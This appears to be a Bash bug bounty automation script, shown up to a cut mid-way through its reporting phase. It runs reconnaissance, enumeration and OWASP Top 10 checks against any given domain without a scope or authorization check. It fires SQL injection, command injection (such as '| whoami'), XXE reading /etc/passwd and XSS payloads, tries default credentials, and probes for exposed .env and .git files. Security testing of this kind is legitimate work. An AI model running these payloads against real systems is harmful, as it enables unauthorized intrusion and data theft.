#!/bin/bash

################################################################################
#                     AWJUNAID SCRIPT ENGINE v2.0
#              Professional Bug Bounty Automation Framework
#
# Author: AWJUNAID Development Team
# Date: 2026-04-09
# Description: Full-stack automated bug bounty reconnaissance, scanning,
#              vulnerability assessment, and reporting platform
# License: MIT
################################################################################

set -euo pipefail
IFS=$'\n\t'

################################################################################
# COLOR AND FORMATTING CONSTANTS
################################################################################

readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly MAGENTA='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly NC='\033[0m' # No Color

################################################################################
# GLOBAL VARIABLES
################################################################################

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DOMAIN=""
SCAN_MODE="medium"
THREADS=10
TIMEOUT=30
OUTPUT_DIR=""
LOG_FILE=""
TARGET_LIST=()
VERBOSE=0
WAF_BYPASS=0
RETRY_ATTEMPTS=3
RATE_LIMIT=0
START_TIME=$(date +%s)

# OWASP Top 10 Tracking
declare -A VULNERABILITIES=(
    [injection]=0
    [broken_auth]=0
    [sensitive_data]=0
    [xml_external]=0
    [broken_access]=0
    [security_misconfiguration]=0
    [xss]=0
    [insecure_deserialization]=0
    [using_components_known_vuln]=0
    [insufficient_logging]=0
)

################################################################################
# UTILITY FUNCTIONS
################################################################################

# Initialize logging
init_logging() {
    local domain=$1
    OUTPUT_DIR="${SCRIPT_DIR}/reports/${domain}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"
    LOG_FILE="${OUTPUT_DIR}/scan.log"
    touch "$LOG_FILE"
}

# Print colored output
print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
 ___     ___       __  __  __  ___  __   __     __  ___  ____
|  _)   / __)  _  (  )(  )(  )(  _)(  ) (  )   / _ \(  _)(    \
| |    ( (___ / \ ) (  ) (  ) ( ) _) (/ (_/   ( (_) ))__)  ) D (
|_|     \___)\_/ (__) (__)(__)(___)(_/\_)_)    \___/(____)(____)

        AWJUNAID SCRIPT ENGINE v2.0
        Professional Bug Bounty Automation
EOF
    echo -e "${NC}"
}

# Logging function
log() {
    local level=$1
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        INFO)
            echo -e "${BLUE}[${timestamp}] [INFO]${NC} ${message}" | tee -a "$LOG_FILE"
            ;;
        SUCCESS)
            echo -e "${GREEN}[${timestamp}] [✓]${NC} ${message}" | tee -a "$LOG_FILE"
            ;;
        WARN)
            echo -e "${YELLOW}[${timestamp}] [⚠]${NC} ${message}" | tee -a "$LOG_FILE"
            ;;
        ERROR)
            echo -e "${RED}[${timestamp}] [✗]${NC} ${message}" | tee -a "$LOG_FILE"
            ;;
        DEBUG)
            if [[ $VERBOSE -eq 1 ]]; then
                echo -e "${MAGENTA}[${timestamp}] [DEBUG]${NC} ${message}" | tee -a "$LOG_FILE"
            fi
            ;;
    esac
}

# Check if tool exists
check_tool() {
    if ! command -v "$1" &> /dev/null; then
        log ERROR "Required tool not found: $1"
        return 1
    fi
    return 0
}

# Make HTTP request with retry logic
http_request() {
    local method=$1
    local url=$2
    local max_retries=${3:-3}
    local attempt=1
    
    while [[ $attempt -le $max_retries ]]; do
        local response
        response=$(curl -s -w "\n%{http_code}" \
            -X "$method" \
            -H "User-Agent: AWJUNAID/2.0" \
            -H "Accept: */*" \
            --connect-timeout "$TIMEOUT" \
            --max-time "$TIMEOUT" \
            "$url" 2>/dev/null || echo "ERROR:000")
        
        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | head -n-1)
        
        if [[ "$http_code" != "000" ]]; then
            echo "$body"
            return 0
        fi
        
        if [[ $attempt -lt $max_retries ]]; then
            local wait_time=$((2 ** attempt))
            log WARN "Request failed, retry $attempt/$max_retries (waiting ${wait_time}s)"
            sleep "$wait_time"
        fi
        ((attempt++))
    done
    
    return 1
}

# Rate limiting control
apply_rate_limit() {
    if [[ $RATE_LIMIT -gt 0 ]]; then
        sleep "$(echo "scale=2; 1/$RATE_LIMIT" | bc)"
    fi
}

################################################################################
# PHASE 1: RECONNAISSANCE
################################################################################

recon_phase() {
    local domain=$1
    log INFO "========== RECON PHASE STARTED =========="
    log INFO "Target: $domain | Mode: $SCAN_MODE | Threads: $THREADS"
    
    local recon_file="${OUTPUT_DIR}/01_recon.txt"
    {
        echo "=== RECONNAISSANCE REPORT ==="
        echo "Domain: $domain"
        echo "Date: $(date)"
        echo ""
    } > "$recon_file"
    
    # Subdomain Enumeration
    log INFO "🔍 Enumerating subdomains..."
    recon_subdomains "$domain" >> "$recon_file"
    
    # DNS Records
    log INFO "🌐 Collecting DNS records..."
    recon_dns "$domain" >> "$recon_file"
    
    # Live Host Detection
    log INFO "🎯 Detecting live hosts..."
    recon_live_hosts "$domain" >> "$recon_file"
    
    # Historical URLs (Wayback, GAU)
    if [[ "$SCAN_MODE" != "soft" ]]; then
        log INFO "📜 Fetching historical URLs..."
        recon_wayback "$domain" >> "$recon_file"
    fi
    
    # Version Detection (Nmap)
    if [[ "$SCAN_MODE" == "hard" ]]; then
        log INFO "🔧 Detecting service versions..."
        recon_versions "$domain" >> "$recon_file"
    fi
    
    # Reverse Proxy Detection
    log INFO "🔄 Checking reverse proxy configuration..."
    recon_reverse_proxy "$domain" >> "$recon_file"
    
    # Technology Stack Detection (whatweb)
    log INFO "⚙️  Detecting underlying technologies..."
    recon_technology "$domain" >> "$recon_file"
    
    # Sitemap Discovery
    log INFO "🗺️  Discovering sitemaps..."
    recon_sitemap "$domain" >> "$recon_file"
    
    # HTTP Headers
    log INFO "📋 Analyzing HTTP headers..."
    recon_headers "$domain" >> "$recon_file"
    
    log SUCCESS "Reconnaissance complete! Results in: $recon_file"
}

recon_subdomains() {
    local domain=$1
    echo "=== SUBDOMAINS ==="
    
    # Using multiple sources
    if command -v subfinder &> /dev/null; then
        subfinder -d "$domain" -silent 2>/dev/null || true
    fi
    
    if command -v amass &> /dev/null; then
        amass enum -d "$domain" -passive 2>/dev/null | grep -oE '[a-z0-9.-]+\.'$domain'$' || true
    fi
    
    # Using online APIs via curl
    log DEBUG "Checking crt.sh for SSL certificates..."
    curl -s "https://crt.sh/?q=%25.$domain&output=json" 2>/dev/null | \
        grep -o '"name_value":"[^"]*"' | cut -d'"' -f4 | sort -u || true
    
    echo ""
}

recon_dns() {
    local domain=$1
    echo "=== DNS RECORDS ==="
    
    # A Records
    echo "A Records:"
    dig +short A "$domain" || echo "N/A"
    
    # AAAA Records
    echo -e "\nAAAA Records:"
    dig +short AAAA "$domain" || echo "N/A"
    
    # MX Records
    echo -e "\nMX Records:"
    dig +short MX "$domain" || echo "N/A"
    
    # NS Records
    echo -e "\nNS Records:"
    dig +short NS "$domain" || echo "N/A"
    
    # TXT Records
    echo -e "\nTXT Records:"
    dig +short TXT "$domain" || echo "N/A"
    
    # CNAME Records
    echo -e "\nCNAME Records:"
    dig +short CNAME "$domain" || echo "N/A"
    
    echo ""
}

recon_live_hosts() {
    local domain=$1
    echo "=== LIVE HOST DETECTION ==="
    
    # Get IP and check connectivity
    local ip
    ip=$(dig +short "$domain" | head -1)
    
    if [[ -n "$ip" ]]; then
        echo "Primary IP: $ip"
        
        # ICMP ping
        if ping -c 1 -W 1 "$domain" &>/dev/null; then
            echo "Status: LIVE (ICMP reachable)"
        else
            # HTTP check
            if curl -s -m 5 -o /dev/null -w "%{http_code}" "http://$domain" 2>/dev/null | grep -q "[2-4][0-9][0-9]"; then
                echo "Status: LIVE (HTTP reachable)"
            else
                echo "Status: POSSIBLY UP (DNS resolves)"
            fi
        fi
    else
        echo "Status: OFFLINE (DNS not resolving)"
    fi
    
    echo ""
}

recon_wayback() {
    local domain=$1
    echo "=== WAYBACK MACHINE URLs ==="
    
    # Using WaybackMachine API
    curl -s "https://archive.org/wayback/available?url=$domain&matchType=domain" 2>/dev/null | \
        grep -o '"timestamp":"[^"]*"' | head -20 || echo "No historical data found"
    
    # Using GAU (if installed)
    if command -v gau &> /dev/null; then
        log DEBUG "Fetching with GAU..."
        gau --subs "$domain" 2>/dev/null | head -20 || true
    fi
    
    echo ""
}

recon_versions() {
    local domain=$1
    echo "=== SERVICE VERSION DETECTION (Nmap) ==="
    
    if ! command -v nmap &> /dev/null; then
        echo "Nmap not installed. Skipping version detection."
        return
    fi
    
    local ip
    ip=$(dig +short "$domain" | head -1)
    
    if [[ -n "$ip" ]]; then
        nmap -sV --script http-title "$ip" -p 80,443,8080,8443 2>/dev/null | tail -20 || echo "Nmap scan failed"
    fi
    
    echo ""
}

recon_reverse_proxy() {
    local domain=$1
    echo "=== REVERSE PROXY DETECTION ==="
    
    local headers
    headers=$(curl -s -I "https://$domain" 2>/dev/null || curl -s -I "http://$domain" 2>/dev/null)
    
    if echo "$headers" | grep -qi "cloudflare\|akamai\|fastly\|cloudfront\|incapsula\|imperva"; then
        echo "⚠️  REVERSE PROXY DETECTED"
        echo "$headers" | grep -i "server\|x-cache\|x-powered-by"
    else
        echo "✓ No obvious reverse proxy detected"
    fi
    
    echo ""
}

recon_technology() {
    local domain=$1
    echo "=== TECHNOLOGY STACK DETECTION ==="
    
    # Using curl for technology hints
    local headers
    headers=$(curl -s -I "https://$domain" 2>/dev/null || curl -s -I "http://$domain" 2>/dev/null)
    
    echo "Server Information:"
    echo "$headers" | grep -i "server:" || echo "Server header hidden"
    
    echo -e "\nX-Powered-By:"
    echo "$headers" | grep -i "x-powered-by:" || echo "Not disclosed"
    
    # If whatweb is installed
    if command -v whatweb &> /dev/null; then
        echo -e "\nWhatWeb Analysis:"
        whatweb -q "$domain" 2>/dev/null || true
    fi
    
    echo ""
}

recon_sitemap() {
    local domain=$1
    echo "=== SITEMAP DISCOVERY ==="
    
    # Common sitemap locations
    local sitemap_urls=(
        "https://$domain/sitemap.xml"
        "http://$domain/sitemap.xml"
        "https://$domain/robots.txt"
        "http://$domain/robots.txt"
    )
    
    for url in "${sitemap_urls[@]}"; do
        if curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null | grep -q "200"; then
            echo "Found: $url"
            curl -s "$url" 2>/dev/null | head -30
        fi
    done
    
    echo ""
}

recon_headers() {
    local domain=$1
    echo "=== HTTP HEADERS ANALYSIS ==="
    
    local headers
    headers=$(curl -s -I "https://$domain" 2>/dev/null || curl -s -I "http://$domain" 2>/dev/null)
    
    echo "Full Headers:"
    echo "$headers"
    
    # Security header check
    echo -e "\n=== SECURITY HEADERS CHECK ==="
    
    local security_headers=(
        "Strict-Transport-Security"
        "X-Content-Type-Options"
        "X-Frame-Options"
        "X-XSS-Protection"
        "Content-Security-Policy"
        "Referrer-Policy"
        "Permissions-Policy"
    )
    
    for header in "${security_headers[@]}"; do
        if echo "$headers" | grep -qi "$header"; then
            echo "✓ $header: Present"
        else
            echo "✗ $header: Missing"
        fi
    done
    
    echo ""
}

################################################################################
# PHASE 2: ENUMERATION
################################################################################

enumeration_phase() {
    local domain=$1
    log INFO "========== ENUMERATION PHASE STARTED =========="
    
    local enum_file="${OUTPUT_DIR}/02_enumeration.txt"
    {
        echo "=== ENUMERATION REPORT ==="
        echo "Domain: $domain"
        echo "Date: $(date)"
        echo ""
    } > "$enum_file"
    
    # Directory Enumeration
    if [[ "$SCAN_MODE" != "soft" ]]; then
        log INFO "📁 Enumerating directories..."
        enum_directories "$domain" >> "$enum_file"
    fi
    
    # Endpoint Discovery
    log INFO "🔗 Discovering endpoints..."
    enum_endpoints "$domain" >> "$enum_file"
    
    # Parameter Discovery
    if [[ "$SCAN_MODE" == "medium" ]] || [[ "$SCAN_MODE" == "hard" ]]; then
        log INFO "⚙️  Finding parameters..."
        enum_parameters "$domain" >> "$enum_file"
    fi
    
    # API Endpoint Discovery
    log INFO "🚀 Discovering API endpoints..."
    enum_api_endpoints "$domain" >> "$enum_file"
    
    log SUCCESS "Enumeration complete! Results in: $enum_file"
}

enum_directories() {
    local domain=$1
    echo "=== DIRECTORY ENUMERATION ==="
    
    if ! command -v dirsearch &> /dev/null && ! command -v ffuf &> /dev/null; then
        echo "No fuzzing tool installed (dirsearch/ffuf). Install for directory enumeration."
        return
    fi
    
    local url="https://$domain"
    
    if command -v ffuf &> /dev/null; then
        log DEBUG "Using ffuf for directory fuzzing..."
        # Light fuzzing only
        ffuf -w /usr/share/wordlists/dirb/common.txt -u "${url}/FUZZ" -mc 200,301,302 -t "$THREADS" -timeout 5 2>/dev/null | grep -oE "^.*\[" || echo "No directories found"
    fi
    
    echo ""
}

enum_endpoints() {
    local domain=$1
    echo "=== ENDPOINT DISCOVERY ==="
    
    # Common web paths
    local common_paths=(
        "/api/v1"
        "/api/v2"
        "/api"
        "/admin"
        "/dashboard"
        "/login"
        "/register"
        "/user"
        "/search"
        "/profile"
        "/settings"
    )
    
    for path in "${common_paths[@]}"; do
        local url="https://$domain$path"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "$url" 2>/dev/null)
        
        if [[ "$status" != "000" ]] && [[ "$status" != "404" ]]; then
            echo "[$status] $path"
        fi
    done
    
    echo ""
}

enum_parameters() {
    local domain=$1
    echo "=== PARAMETER DISCOVERY ==="
    
    # Using ParamSpider if available
    if command -v paramspider &> /dev/null; then
        log DEBUG "Running ParamSpider..."
        paramspider -d "$domain" --subs -o 2>/dev/null | head -30 || true
    else
        echo "ParamSpider not installed. Common parameters:"
        echo "id, page, search, q, user, file, path, url, data, action, filter, sort, callback, redirect"
    fi
    
    echo ""
}

enum_api_endpoints() {
    local domain=$1
    echo "=== API ENDPOINT DISCOVERY ==="
    
    # Common API patterns
    local api_patterns=(
        "/api/v1/users"
        "/api/v1/products"
        "/api/v2/search"
        "/api/auth/login"
        "/api/profile"
        "/graphql"
        "/.well-known/openid-configuration"
    )
    
    for pattern in "${api_patterns[@]}"; do
        local url="https://$domain$pattern"
        local response
        response=$(curl -s -w "\n%{http_code}" -m 5 "$url" 2>/dev/null)
        local status=$(echo "$response" | tail -1)
        
        if [[ "$status" =~ ^[2-4][0-9]{2}$ ]]; then
            echo "✓ Found: $pattern (HTTP $status)"
        fi
    done
    
    echo ""
}

################################################################################
# PHASE 3: SCANNING - OWASP TOP 10 VULNERABILITIES
################################################################################

scanning_phase() {
    local domain=$1
    log INFO "========== SCANNING PHASE STARTED =========="
    
    local scan_file="${OUTPUT_DIR}/03_scanning.txt"
    {
        echo "=== VULNERABILITY SCANNING REPORT ==="
        echo "Domain: $domain"
        echo "Scan Mode: $SCAN_MODE"
        echo "Date: $(date)"
        echo ""
    } > "$scan_file"
    
    # OWASP Top 10 Scans
    log INFO "🛡️  Scanning for OWASP Top 10 vulnerabilities..."
    
    # 1. Injection (SQLi, Command Injection)
    log INFO "  [1/10] Scanning for Injection attacks..."
    scan_injection "$domain" >> "$scan_file"
    
    # 2. Broken Authentication
    log INFO "  [2/10] Scanning for Broken Authentication..."
    scan_broken_auth "$domain" >> "$scan_file"
    
    # 3. Sensitive Data Exposure
    log INFO "  [3/10] Scanning for Sensitive Data Exposure..."
    scan_sensitive_data "$domain" >> "$scan_file"
    
    # 4. XML External Entities
    log INFO "  [4/10] Scanning for XML External Entities..."
    scan_xxe "$domain" >> "$scan_file"
    
    # 5. Broken Access Control (IDOR)
    log INFO "  [5/10] Scanning for Broken Access Control (IDOR)..."
    scan_idor "$domain" >> "$scan_file"
    
    # 6. Security Misconfiguration
    log INFO "  [6/10] Scanning for Security Misconfiguration..."
    scan_misconfiguration "$domain" >> "$scan_file"
    
    # 7. Cross-Site Scripting (XSS)
    log INFO "  [7/10] Scanning for XSS vulnerabilities..."
    scan_xss "$domain" >> "$scan_file"
    
    # 8. Insecure Deserialization
    log INFO "  [8/10] Scanning for Insecure Deserialization..."
    scan_deserialization "$domain" >> "$scan_file"
    
    # 9. Using Components with Known Vulnerabilities
    log INFO "  [9/10] Scanning for Known Vulnerable Components..."
    scan_vulnerable_components "$domain" >> "$scan_file"
    
    # 10. Insufficient Logging & Monitoring
    log INFO "  [10/10] Scanning for Insufficient Logging..."
    scan_logging "$domain" >> "$scan_file"
    
    # Nuclei Scanning (if available)
    if command -v nuclei &> /dev/null && [[ "$SCAN_MODE" != "soft" ]]; then
        log INFO "🔬 Running Nuclei templates..."
        scan_nuclei "$domain" >> "$scan_file"
    fi
    
    # Dalfox Scanning (if available)
    if command -v dalfox &> /dev/null && [[ "$SCAN_MODE" != "soft" ]]; then
        log INFO "🐺 Running Dalfox XSS scanner..."
        scan_dalfox "$domain" >> "$scan_file"
    fi
    
    log SUCCESS "Scanning complete! Results in: $scan_file"
}

scan_injection() {
    local domain=$1
    echo "=== INJECTION VULNERABILITIES ==="
    
    # SQLi payloads
    local sqli_payloads=(
        "' OR '1'='1"
        "' OR 1=1 --"
        "admin' --"
        "' UNION SELECT NULL --"
    )
    
    # Test SQLi on login/search endpoints
    local test_urls=(
        "https://$domain/login"
        "https://$domain/search"
        "https://$domain/api/search"
    )
    
    echo "SQL Injection Testing:"
    for url in "${test_urls[@]}"; do
        for payload in "${sqli_payloads[@]}"; do
            local response
            response=$(curl -s -m 5 "$url?q=$(echo -n "$payload" | jq -sRr @uri)" 2>/dev/null || true)
            
            # Basic SQLi indicators
            if echo "$response" | grep -qi "sql\|mysql\|syntax error\|warning.*mysql"; then
                echo "⚠️  Potential SQLi: $url (payload: $payload)"
                ((VULNERABILITIES[injection]++))
            fi
        done
    done
    
    # Command Injection
    echo -e "\nCommand Injection Testing:"
    local cmd_payloads=(
        "ping -c 1 127.0.0.1"
        "; ls -la"
        "| whoami"
    )
    
    for url in "${test_urls[@]}"; do
        for payload in "${cmd_payloads[@]}"; do
            local response
            response=$(curl -s -m 5 "$url?q=$(echo -n "$payload" | jq -sRr @uri)" 2>/dev/null || true)
            
            if echo "$response" | grep -qi "root\|bin\|etc\|drwx"; then
                echo "⚠️  Potential Command Injection: $url"
                ((VULNERABILITIES[injection]++))
            fi
        done
    done
    
    echo ""
}

scan_broken_auth() {
    local domain=$1
    echo "=== BROKEN AUTHENTICATION ==="
    
    # Check for weak authentication patterns
    echo "Testing common default credentials..."
    
    local common_creds=(
        "admin:admin"
        "admin:password"
        "test:test"
        "root:root"
    )
    
    for cred in "${common_creds[@]}"; do
        local user=$(echo "$cred" | cut -d: -f1)
        local pass=$(echo "$cred" | cut -d: -f2)
        
        local response
        response=$(curl -s -m 5 -u "$user:$pass" "https://$domain/api/auth/login" 2>/dev/null || true)
        
        if echo "$response" | grep -qi "success\|token\|authenticated"; then
            echo "⚠️  Weak Credentials Found: $user:$pass"
            ((VULNERABILITIES[broken_auth]++))
        fi
    done
    
    # Check for JWT issues
    echo -e "\nChecking JWT implementation..."
    if curl -s "https://$domain/api/user" 2>/dev/null | grep -qi "jwt\|bearer\|token"; then
        echo "ℹ️  JWT implementation detected - Manual testing recommended"
    fi
    
    echo ""
}

scan_sensitive_data() {
    local domain=$1
    echo "=== SENSITIVE DATA EXPOSURE ==="
    
    # Check for unencrypted HTTP
    echo "Protocol Security:"
    if curl -s -m 5 "http://$domain" 2>/dev/null | grep -q "http"; then
        echo "⚠️  HTTP Protocol Detected (Should be HTTPS)"
        ((VULNERABILITIES[sensitive_data]++))
    fi
    
    # Check SSL/TLS
    if command -v openssl &> /dev/null; then
        echo -e "\nSSL/TLS Configuration:"
        echo | openssl s_client -connect "$domain:443" 2>/dev/null | grep -A 2 "Protocol" || true
    fi
    
    # Check for API keys in responses
    echo -e "\nScanning for exposed sensitive data..."
    local response
    response=$(curl -s "https://$domain/api/v1" 2>/dev/null)
    
    if echo "$response" | grep -iE "api[_-]?key|secret|password|token"; then
        echo "⚠️  Potential exposed credentials/keys in response"
        ((VULNERABILITIES[sensitive_data]++))
    fi
    
    echo ""
}

scan_xxe() {
    local domain=$1
    echo "=== XML EXTERNAL ENTITIES (XXE) ==="
    
    # XXE payload
    local xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    
    local api_urls=(
        "https://$domain/api/upload"
        "https://$domain/api/parse"
        "https://$domain/api/xml"
    )
    
    echo "XXE Testing:"
    for url in "${api_urls[@]}"; do
        local response
        response=$(curl -s -m 5 -X POST -d "$xxe_payload" "$url" 2>/dev/null || true)
        
        if echo "$response" | grep -iE "root:|nobody:|bin/"; then
            echo "⚠️  XXE Vulnerability Found: $url"
            ((VULNERABILITIES[xml_external]++))
        fi
    done
    
    echo ""
}

scan_idor() {
    local domain=$1
    echo "=== BROKEN ACCESS CONTROL (IDOR) ==="
    
    echo "Testing for IDOR vulnerabilities..."
    
    # Common IDOR patterns
    local idor_patterns=(
        "/api/user/1"
        "/api/user/2"
        "/api/profile/1"
        "/api/document/1"
        "/api/report/1"
    )
    
    echo "Comparing resource access patterns:"
    for pattern in "${idor_patterns[@]}"; do
        local url="https://$domain$pattern"
        local response1
        local response2
        
        response1=$(curl -s -m 5 "$url" 2>/dev/null | md5sum | cut -d' ' -f1)
        response2=$(curl -s -m 5 "${url%/*}/2" 2>/dev/null | md5sum | cut -d' ' -f1)
        
        if [[ "$response1" != "$response2" ]]; then
            echo "ℹ️  Different responses detected - Potential IDOR: $pattern"
            ((VULNERABILITIES[broken_access]++))
        fi
    done
    
    echo ""
}

scan_misconfiguration() {
    local domain=$1
    echo "=== SECURITY MISCONFIGURATION ==="
    
    # Check common misconfigurations
    echo "Security Configuration Audit:"
    
    # Backup files
    local backup_files=(
        "/.git"
        "/.gitconfig"
        "/.env"
        "/config.php.bak"
        "/config.js.bak"
        "/web.config"
        "/web.config.bak"
    )
    
    for file in "${backup_files[@]}"; do
        local url="https://$domain$file"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "$url" 2>/dev/null)
        
        if [[ "$status" == "200" ]]; then
            echo "⚠️  Exposed File: $file (HTTP $status)"
            ((VULNERABILITIES[security_misconfiguration]++))
        fi
    done
    
    # Debug mode check
    echo -e "\nDebug Mode Detection:"
    local response
    response=$(curl -s -m 5 "https://$domain?debug=1" 2>/dev/null)
    
    if echo "$response" | grep -iE "debug|traceback|exception"; then
        echo "⚠️  Debug Mode Enabled"
        ((VULNERABILITIES[security_misconfiguration]++))
    fi
    
    echo ""
}

scan_xss() {
    local domain=$1
    echo "=== CROSS-SITE SCRIPTING (XSS) ==="
    
    # XSS payloads
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "\"><script>alert('XSS')</script>"
        "javascript:alert('XSS')"
        "<img src=x onerror='alert(1)'>"
        "<svg onload=alert('XSS')>"
    )
    
    # Test on common parameters
    local test_params=(
        "search"
        "q"
        "query"
        "name"
        "comment"
    )
    
    echo "XSS Vulnerability Testing:"
    for param in "${test_params[@]}"; do
        for payload in "${xss_payloads[@]}"; do
            local url="https://$domain/?$param=$(echo -n "$payload" | jq -sRr @uri)"
            local response
            response=$(curl -s -m 5 "$url" 2>/dev/null)
            
            # Check if payload is reflected without encoding
            if echo "$response" | grep -q "<script>alert('XSS')</script>"; then
                echo "⚠️  Reflected XSS Found: Parameter '$param'"
                ((VULNERABILITIES[xss]++))
                break
            fi
        done
    done
    
    echo ""
}

scan_deserialization() {
    local domain=$1
    echo "=== INSECURE DESERIALIZATION ==="
    
    echo "Testing for deserialization vulnerabilities..."
    
    # Check for common serialization formats
    local response
    response=$(curl -s -m 5 "https://$domain/api" 2>/dev/null)
    
    if echo "$response" | grep -iE "serialized|object\(|pickle|yaml"; then
        echo "⚠️  Potentially unsafe serialization detected"
        ((VULNERABILITIES[insecure_deserialization]++))
    fi
    
    echo ""
}

scan_vulnerable_components() {
    local domain=$1
    echo "=== USING COMPONENTS WITH KNOWN VULNERABILITIES ==="
    
    echo "Checking for known vulnerable versions..."
    
    # Get response headers and content
    local response
    response=$(curl -s -I -m 5 "https://$domain" 2>/dev/null)
    
    # Check for common vulnerable libraries
    local vulnerable_patterns=(
        "jquery/[0-9]\.[0-9]\.[0-9]"
        "bootstrap/[0-9]\.[0-9]\.[0-9]"
        "wordpress/[0-9]\.[0-9]\.[0-9]"
    )
    
    for pattern in "${vulnerable_patterns[@]}"; do
        if echo "$response" | grep -iE "$pattern"; then
            echo "⚠️  Potentially vulnerable component detected: $pattern"
            ((VULNERABILITIES[using_components_known_vuln]++))
        fi
    done
    
    echo ""
}

scan_logging() {
    local domain=$1
    echo "=== INSUFFICIENT LOGGING & MONITORING ==="
    
    echo "Checking logging mechanisms..."
    
    # Check for security event logging
    local response
    response=$(curl -s -m 5 "https://$domain/admin/logs" 2>/dev/null)
    
    if echo "$response" | grep -iE "log|event|audit" > /dev/null; then
        echo "ℹ️  Logging mechanism present - Manual review recommended"
    else
        echo "⚠️  No obvious logging mechanism detected"
        ((VULNERABILITIES[insufficient_logging]++))
    fi
    
    echo ""
}

scan_nuclei() {
    local domain=$1
    echo "=== NUCLEI TEMPLATE SCAN ==="
    
    if ! command -v nuclei &> /dev/null; then
        return
    fi
    
    # Determine template severity based on scan mode
    local severity="low,medium"
    if [[ "$SCAN_MODE" == "hard" ]]; then
        severity="low,medium,high,critical"
    fi
    
    log DEBUG "Running nuclei with severity: $severity"
    nuclei -u "https://$domain" -t /root/nuclei-templates/ \
        -severity "$severity" -json 2>/dev/null | \
        jq -r '.template_id, .severity, .description' | \
        paste -d' ' - - - || echo "Nuclei scan completed"
    
    echo ""
}

scan_dalfox() {
    local domain=$1
    echo "=== DALFOX XSS SCAN ==="
    
    if ! command -v dalfox &> /dev/null; then
        return
    fi
    
    dalfox url "https://$domain" --timeout 10 --workers "$THREADS" 2>/dev/null | \
        grep -iE "found|vulnerable|xss" || echo "No XSS found by Dalfox"
    
    echo ""
}

################################################################################
# PHASE 4: EXPLOITATION & VALIDATION
################################################################################

exploitation_phase() {
    local domain=$1
    log INFO "========== EXPLOITATION PHASE STARTED =========="
    
    local exploit_file="${OUTPUT_DIR}/04_exploitation.txt"
    {
        echo "=== EXPLOITATION & VALIDATION REPORT ==="
        echo "Domain: $domain"
        echo "Date: $(date)"
        echo ""
    } > "$exploit_file"
    
    log INFO "🔓 Validating vulnerabilities..."
    
    # PoC Generation
    if [[ "${VULNERABILITIES[xss]}" -gt 0 ]]; then
        log INFO "Generating XSS PoC..."
        generate_xss_poc "$domain" >> "$exploit_file"
    fi
    
    if [[ "${VULNERABILITIES[injection]}" -gt 0 ]]; then
        log INFO "Generating SQL Injection PoC..."
        generate_sqli_poc "$domain" >> "$exploit_file"
    fi
    
    if [[ "${VULNERABILITIES[broken_access]}" -gt 0 ]]; then
        log INFO "Generating IDOR PoC..."
        generate_idor_poc "$domain" >> "$exploit_file"
    fi
    
    log SUCCESS "Exploitation phase complete! Results in: $exploit_file"
}

generate_xss_poc() {
    local domain=$1
    echo "=== XSS PROOF OF CONCEPT ==="
    echo "Domain: $domain"
    echo "Payload: <img src=x onerror='alert(document.domain)'>"
    echo "Test URL: https://$domain/?search=<img src=x onerror='alert(document.domain)'>"
    echo ""
}

generate_sqli_poc() {
    local domain=$1
    echo "=== SQL INJECTION PROOF OF CONCEPT ==="
    echo "Domain: $domain"
    echo "Payload: ' OR '1'='1"
    echo "Test URL: https://$domain/login?username=' OR '1'='1"
    echo ""
}

generate_idor_poc() {
    local domain=$1
    echo "=== IDOR PROOF OF CONCEPT ==="
    echo "Domain: $domain"
    echo "Description: Horizontal privilege escalation via object reference"
    echo "Test: Access /api/user/1, /api/user/2, /api/user/3"
    echo ""
}

################################################################################
# PHASE 5: REPORTING
################################################################################

reporting_phase() {
    local domain=$1
    log INFO "========== REPORTING PHASE STARTED =========="
    
    # Generate JSON Report
    generate_json_report "$domain"
    
    # Generate TXT Report
    generate_txt_report "$domain"
    
    # Generate CSV Report
    generate_csv_report "$domain"
    
    # Generate HTML Report (Enhanced)
    generate_html_report "$domain"
    
    log SUCCESS "All reports generated in: $OUTPUT_DIR"
}

generate_json_report() {
    local domain=$1
    local json_file="${OUTPUT_DIR}/REPORT.json"
    
    cat > "$json_file" << 'EOFJS'
{
  "scan_metadata": {
    "domain": "DOMAIN_PLACEHOLDER",
    "scan_date": "DATE_PLACEHOLDER",
    "scan_mode": "MODE_PLACEHOLDER",
    "total_duration_seconds": DURATION_PLACEHOLDER,
    "scan_status": "completed"
  },
  "vulnerability_summary": {
    "total_vulnerabilities": TOTAL_PLACEHOLDER,
    "critical": CRITICAL_PLACEHOLDER,
    "high": HIGH_PLACEHOLDER,
    "medium": MEDIUM_PLACEHOLDER,
    "low": LOW_PLACEHOLDER
  },
  "owasp_top_10": {
    "injection": INJECTION_PLACEHOLDER,
    "broken_authentication": BROKEN_AUTH_PLACEHOLDER,
    "sensitive_data_exposure": SENSITIVE_PLACEHOLDER,
    "xml_external_entities": XXE_PLACEHOLDER,
    "broken_access_control": IDOR_PLACEHOLDER,
    "security_misconfiguration": MISCONFIG_PLACEHOLDER,
    "cross_site_scripting": XSS_PLACEHOLDER,
    "insecure_deserialization": DESER_PLACEHOLDER,
    "using_components_with_known_vulnerabilities": COMPONENTS_PLACEHOLDER,
    "insufficient_logging_and_monitoring": LOGGING_PLACEHOLDER
  },
  "vulnerabilities": [
    {
      "id": "VULN-001",
      "type": "Cross-Site Scripting (XSS)",
      "severity": "High",
      "location": "https://target.com/?search=",
      "description": "Reflected XSS in search parameter",
      "payload": "<img src=x onerror='alert(1)'>",
      "remediation": "Implement input validation and output encoding"
    }
  ],
  "recommendations": [
    "Implement Web Application Firewall (WAF)",
    "Regular security code reviews",
    "Implement SAST/DAST in CI/CD pipeline",
    "Security awareness training"
  ]
}
EOFJS
    
    # Replace placeholders
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    
